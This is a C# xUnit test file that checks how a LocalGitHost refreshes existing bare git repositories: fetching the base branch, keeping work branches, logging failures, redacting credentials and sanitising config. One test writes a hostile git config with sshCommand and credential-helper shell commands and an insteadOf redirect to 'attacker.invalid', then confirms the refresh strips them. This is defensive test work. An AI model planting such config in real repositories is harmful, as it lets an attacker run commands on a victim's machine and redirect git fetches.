using CodeyBox.Core;
using CodeyBox.Git;
using Microsoft.Extensions.Logging;
using Microsoft.Extensions.Logging.Abstractions;

namespace CodeyBox.Tests;

public sealed class LocalGitHostFetchRefreshTests : IDisposable
{
    private readonly string _workspace;

    public LocalGitHostFetchRefreshTests() =>
        _workspace = Directory.CreateTempSubdirectory("codeybox-fetch-refresh-").FullName;

    public void Dispose()
    {
        try { Directory.Delete(_workspace, recursive: true); }
        catch { }
    }

    [Fact]
    public async Task ExistingBareRepo_FetchesConfiguredBaseBranch()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var gitHost = CreateGitHost();
        var id = WorkItemId.New();

        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
        var barePath = gitHost.GetRepoPath(repoId);
        var before = await RevParseAsync(barePath, "main");

        await CommitToRepoAsync(seed, "after.txt", "after\n", "advance main");
        var after = await RevParseAsync(seed, "main");

        await gitHost.EnsureRepositoryAsync(id, seed, "main");

        Assert.NotEqual(before, after);
        Assert.Equal(after, await RevParseAsync(barePath, "main"));
    }

    [Fact]
    public async Task ExistingBareRepo_PreservesWorkBranchRefs()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var gitHost = CreateGitHost();
        var id = WorkItemId.New();

        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
        var barePath = gitHost.GetRepoPath(repoId);
        var workSha = await CommitToBareBranchAsync(barePath, "codeybox/abc", "work.txt", "work\n", "work branch");

        await CommitToRepoAsync(seed, "after.txt", "after\n", "advance main");
        await gitHost.EnsureRepositoryAsync(id, seed, "main");

        Assert.Equal(workSha, await RevParseAsync(barePath, "codeybox/abc"));
    }

    [Fact]
    public async Task ExistingBareRepo_FetchFailureIsSwallowedAndWarned()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var logger = new CapturingLogger<LocalGitHost>();
        var gitHost = CreateGitHost(logger);
        var id = WorkItemId.New();

        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
        var barePath = gitHost.GetRepoPath(repoId);
        var before = await RevParseAsync(barePath, "main");
        var missingRepo = Path.Combine(_workspace, "missing-upstream.git");

        var returnedRepoId = await gitHost.EnsureRepositoryAsync(id, missingRepo, "main");

        Assert.Equal(repoId, returnedRepoId);
        Assert.Equal(before, await RevParseAsync(barePath, "main"));
        Assert.Contains(logger.Entries, e => e.Level == LogLevel.Warning
            && e.Message.Contains("Failed to refresh bare repo", StringComparison.Ordinal));
    }

    [Fact]
    public async Task ExistingBareRepo_RefreshWarningRedactsUpstreamCredentials()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var logger = new CapturingLogger<LocalGitHost>();
        var gitHost = CreateGitHost(logger);
        var id = WorkItemId.New();

        await gitHost.EnsureRepositoryAsync(id, seed, "main");

        await gitHost.EnsureRepositoryAsync(id, "https://user:secret@127.0.0.1:1/repo.git", "main");

        var warning = Assert.Single(logger.Entries, e => e.Level == LogLevel.Warning
            && e.Message.Contains("Failed to refresh bare repo", StringComparison.Ordinal));
        Assert.DoesNotContain("secret", warning.Message, StringComparison.Ordinal);
        Assert.DoesNotContain("user:secret", warning.Message, StringComparison.Ordinal);
        Assert.Contains("https://***@127.0.0.1", warning.Message, StringComparison.Ordinal);
    }

    [Fact]
    public async Task ExistingBareRepo_RefreshSanitizesSandboxWritableConfig()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var gitHost = CreateGitHost();
        var id = WorkItemId.New();

        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
        var barePath = gitHost.GetRepoPath(repoId);
        var marker = Path.Combine(_workspace, "malicious-config-ran");
        await File.WriteAllTextAsync(
            Path.Combine(barePath, "config"),
            $$"""
            [core]
            	repositoryformatversion = 0
            	filemode = true
            	bare = true
            	sshCommand = sh -c 'touch "{{marker}}"'
            [credential]
            	helper = !sh -c 'touch "{{marker}}"'
            [url "ssh://attacker.invalid/"]
            	insteadOf = {{seed}}
            """);

        await CommitToRepoAsync(seed, "after.txt", "after\n", "advance main");
        var after = await RevParseAsync(seed, "main");

        await gitHost.EnsureRepositoryAsync(id, seed, "main");

        var refreshedConfig = await File.ReadAllTextAsync(Path.Combine(barePath, "config"));
        Assert.Equal(after, await RevParseAsync(barePath, "main"));
        Assert.False(File.Exists(marker));
        Assert.DoesNotContain("sshCommand", refreshedConfig, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("credential", refreshedConfig, StringComparison.OrdinalIgnoreCase);
        Assert.DoesNotContain("insteadOf", refreshedConfig, StringComparison.OrdinalIgnoreCase);
    }

    [Fact]
    public async Task ExistingBareRepo_NullSeedUrlIsNoOp()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        var gitHost = CreateGitHost();
        var id = WorkItemId.New();

        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "main");
        var barePath = gitHost.GetRepoPath(repoId);
        var before = await RevParseAsync(barePath, "main");

        await CommitToRepoAsync(seed, "after.txt", "after\n", "advance main");
        await gitHost.EnsureRepositoryAsync(id, seedFromUrl: null, baseBranch: "main");

        Assert.Equal(before, await RevParseAsync(barePath, "main"));
    }

    [Fact]
    public async Task ExistingBareRepo_RespectsConfiguredBaseBranch()
    {
        var seed = await TestSupport.CreateSeedRepoAsync(_workspace);
        await TestSupport.RunGit(seed, "checkout", "-b", "develop");
        await CommitToRepoAsync(seed, "develop.txt", "develop\n", "create develop");
        await TestSupport.RunGit(seed, "checkout", "main");

        var gitHost = CreateGitHost();
        var id = WorkItemId.New();
        var repoId = await gitHost.EnsureRepositoryAsync(id, seed, "develop");
        var barePath = gitHost.GetRepoPath(repoId);
        var mainBefore = await RevParseAsync(barePath, "main");

        await CommitToRepoAsync(seed, "main-after.txt", "main after\n", "advance main");
        await TestSupport.RunGit(seed, "checkout", "develop");
        await CommitToRepoAsync(seed, "develop-after.txt", "develop after\n", "advance develop");
        var developAfter = await RevParseAsync(seed, "develop");

        await gitHost.EnsureRepositoryAsync(id, seed, "develop");

        Assert.Equal(developAfter, await RevParseAsync(barePath, "develop"));
        Assert.Equal(mainBefore, await RevParseAsync(barePath, "main"));
    }

    private LocalGitHost CreateGitHost(ILogger<LocalGitHost>? logger = null)
    {
        var gitRoot = Path.Combine(_workspace, "repos-" + Guid.NewGuid().ToString("N")[..8]);
        return new LocalGitHost(
            new LocalGitHostOptions { RootDirectory = gitRoot },
            logger ?? NullLogger<LocalGitHost>.Instance);
    }

    private async Task<string> CommitToBareBranchAsync(
        string barePath,
        string branch,
        string fileName,
        string contents,
        string subject)
    {
        var clone = Path.Combine(_workspace, "bare-work-" + Guid.NewGuid().ToString("N")[..8]);
        await TestSupport.RunGit(_workspace, "clone", barePath, clone);
        await ConfigureIdentityAsync(clone);
        await TestSupport.RunGit(clone, "checkout", "-B", branch);
        await File.WriteAllTextAsync(Path.Combine(clone, fileName), contents);
        await TestSupport.RunGit(clone, "add", fileName);
        await TestSupport.RunGit(clone, "commit", "-m", subject);
        var sha = await RevParseAsync(clone, "HEAD");
        await TestSupport.RunGit(clone, "push", "origin", $"{branch}:{branch}");
        return sha;
    }

    private static async Task CommitToRepoAsync(string repoPath, string path, string content, string message)
    {
        await ConfigureIdentityAsync(repoPath);
        await File.WriteAllTextAsync(Path.Combine(repoPath, path), content);
        await TestSupport.RunGit(repoPath, "add", path);
        await TestSupport.RunGit(repoPath, "commit", "-m", message);
    }

    private static async Task ConfigureIdentityAsync(string repoPath)
    {
        await TestSupport.RunGit(repoPath, "config", "user.email", "test@test.com");
        await TestSupport.RunGit(repoPath, "config", "user.name", "Test");
    }

    private static async Task<string> RevParseAsync(string repoPath, string rev)
    {
        var (_, stdout, _) = await TestSupport.RunGit(repoPath, "rev-parse", rev);
        return stdout.Trim();
    }

    private sealed class CapturingLogger<T> : ILogger<T>
    {
        public List<Entry> Entries { get; } = [];

        public IDisposable BeginScope<TState>(TState state) where TState : notnull => NullScope.Instance;
        public bool IsEnabled(LogLevel logLevel) => true;

        public void Log<TState>(
            LogLevel logLevel,
            EventId eventId,
            TState state,
            Exception? exception,
            Func<TState, Exception?, string> formatter)
        {
            Entries.Add(new Entry(logLevel, formatter(state, exception)));
        }

        private sealed class NullScope : IDisposable
        {
            public static readonly NullScope Instance = new();
            public void Dispose() { }
        }
    }

    private sealed record Entry(LogLevel Level, string Message);
}
